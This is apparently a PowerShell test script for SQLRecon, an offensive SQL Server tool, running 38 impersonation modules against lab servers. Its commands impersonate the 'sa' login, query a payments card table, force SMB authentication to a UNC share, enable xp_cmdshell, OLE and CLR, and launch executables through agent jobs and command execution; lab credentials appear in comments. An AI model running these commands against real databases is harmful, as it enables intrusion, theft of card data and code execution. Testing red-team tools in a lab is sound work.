<#
    Execution instructions:
    powershell.exe -nop -exec bypass .\SQLRecon-Impersonation-Modules-Test.ps1
#>

<#
    The $global:* variables do not need to be changed.
    The only exception is $global:modules, which can be
    changed to match the number of test cases you execute.
#>
$global:count = 1
$global:modules = 38
$global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"

<#
    The $authentication variable acts as a quick way to
    switch the authentication type for the following commands.
#>
$authentication = "WinToken"
#$authentication = "WinDomain /domain:kawalabs /username:jsmith /password:Password123"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Local /username:sa /password:Password123"
#$authentication = "EntraID /domain:x.onmicrosoft.com /username:jsmith /password:Password123"
#$authentication = "AzureLocal /username:sa /password:Password123"

<#
    The following variables can be changed.
    - $sqlreconPath is the path to where SQLRecon is on disk.
    - $server1 is the hostname or IP of a SQL server.
    - $server2 is the hostname or IP of a SQL server, I use this for linked SQL servers.
    - $server3 is the hostname or IP of a SQL server, you might not need this.
    - $server4 is the hostname or IP of a SQL server, you might not need this.
    - $server5 is the hostname or IP of a SQL server, you might not need this.
    - $impersonationUser is the user you want to impersonate.
    - outputPath is where you want to output the results of this script on disk in markdown.
      keep in mind that the path can not have special characters like ':'. '-' is fine.
#>
$sqlreconPath = ".\SQLRecon.exe"
$server1 = "SQL01"
$server2 = "SQL02"
$server3 = "SQL03"
$server4 = "MECM01"
$server5 = "sqlrecon.database.windows.net"
$impersonateUser = "sa"
$authenticationFormatted = $authentication.replace(' ','-').replace('/','').replace('.','-').replace(':','-')
$outputPath = $PSScriptRoot + "\sqlrecon-impersonation-$authenticationFormatted-$global:timestamp.md"

<#
    .Description
    The Execute function executes a supplied SQLRecon command.
#>
Function Execute($command)
{
    Write-Output "($global:count/$global:modules)"
    Write-Output $command
    Write-Output ""
    Write-Output "Expected Output:"
    Write-Output '```'
    Invoke-Expression $command
    Write-Output '```'
    Write-Output ""
    $global:count++
}

# Configuring output to file.
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $outputPath


Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Impersonation Modules Test Cases"
Write-Output "[+] Variables Set:"
Write-Output "  |-> SQLRecon Path: $sqlreconPath"
Write-Output "  |-> Output Path: $outputPath"
Write-Output "  |-> Authentication: $authentication"
Write-Output "  |-> Impersonating User: $impersonateUser"
Write-Output "  |-> SQL Server 1: $server1"
Write-Output "  |-> SQL Server 2: $server2"
Write-Output "  |-> SQL Server 3: $server3" 
Write-Output "  |-> SQL Server 4: $server4" 
Write-Output "  |-> SQL Server 4: $server5" 
Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Write-Output ""

# Add test cases in this area. In this case there are 38, which is why $global:modules is set to 38.
Write-Output ""
Write-Output "[+] Executing commands - expected to fail to validate error handling"
Write-Output ""
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /l:$server3 /m:checkrpc"
Execute "$sqlreconPath /a:$authentication /i:invaliduser /h:$server2 /m:checkrpc"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:impersonate"
Write-Output ""
Write-Output "[+] Executing unprivileged commands"
Write-Output ""
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:checkrpc"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:databases"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:info"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:links"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:users"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:whoami"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:columns /db:Payments /table:cc"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:query /database:Payments /c:'select * from cc'"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:rows /db:AdventureWorks /table:SalesLT.Customer"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:search /db:Payments /keyword:card"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server3 /m:smb /unc:\\172.16.10.21\test"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:tables /db:AdventureWorks"
Write-Output ""
Write-Output "[+] Executing Privileged Commands"
Write-Output ""
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:disablerpc /rhost:$server1\sqlexpress"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:disablerpc /rhost:$server2"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:disablerpc /rhost:$server3"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:disablerpc /rhost:$server3"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server3 /m:disablerpc /rhost:$server4"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:enablerpc /rhost:$server1\sqlexpress"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:enablerpc /rhost:$server2"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1 /m:enablerpc /rhost:$server3"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:enablerpc /rhost:$server3"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server3 /m:enablerpc /rhost:$server4"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1,$server2,$server3,$server4 /m:disableclr"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1,$server2,$server3,$server4 /m:disableole"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1,$server2,$server3,$server4 /m:disablexp"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1,$server2,$server3,$server4 /m:enableole"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1,$server2,$server3,$server4 /m:enableclr"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server1,$server2,$server3,$server4 /m:enablexp"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server3 /m:adsi /adsi:linkadsi /lport:30000"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:agentstatus"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:agentcmd /subsystem:cmdexec /command:'c:\temp\mb-i1.exe'"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:agentcmd /c:'c:\temp\mb-i2.exe'"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /module:clr /dll:'c:\temp\sql.dll' /function:Chicken"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:olecmd /c:'c:\temp\mb-i3.exe'"
Execute "$sqlreconPath /a:$authentication /i:$impersonateUser /h:$server2 /m:xpcmd /c:'tasklist'"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Impersonation Modules Test Cases"
Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Stop-Transcript